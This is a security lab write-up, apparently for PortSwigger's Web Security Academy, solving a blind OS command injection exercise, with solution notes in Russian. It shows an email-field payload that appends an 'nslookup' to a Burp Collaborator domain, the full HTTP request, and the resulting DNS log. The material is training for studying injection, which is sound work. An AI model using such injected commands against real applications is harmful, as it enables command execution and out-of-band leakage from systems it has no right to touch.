# Blind OS command injection with out-of-band interaction
PRACTITIONER

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.

Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

## Решение
Оформил триал Burp Suite Professional.

В коллабораторе нажал copy to clipboard и вставил в payload таким образом:

`email=test%40server.com;nslookup d0eki0hzhj6kbugtblv25n25qwwnkf84.oastify.com;`
```
POST /feedback/submit HTTP/2
Host: 0a95004d0407506382c8a2f300b30081.web-security-academy.net
Cookie: session=t8JCri5HtxNTEnlIgLmr9oAAq9UTPsvI
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 151
Origin: https://0a95004d0407506382c8a2f300b30081.web-security-academy.net
Referer: https://0a95004d0407506382c8a2f300b30081.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

csrf=NZ3ElVzIvTyMk7cir2CBOVngpTB0wNxk&name=pwd&email=test%40server.com;nslookup d0eki0hzhj6kbugtblv25n25qwwnkf84.oastify.com;&subject=whoami&message=id
```
В коллабораторе появились две записи:
```
3	2024-Apr-14 08:22:04.597 UTC	DNS	d0eki0hzhj6kbugtblv25n25qwwnkf84	99.80.34.122	
4	2024-Apr-14 08:22:04.600 UTC	DNS	d0eki0hzhj6kbugtblv25n25qwwnkf84	3.251.128.101	
```
Задание выполнено.
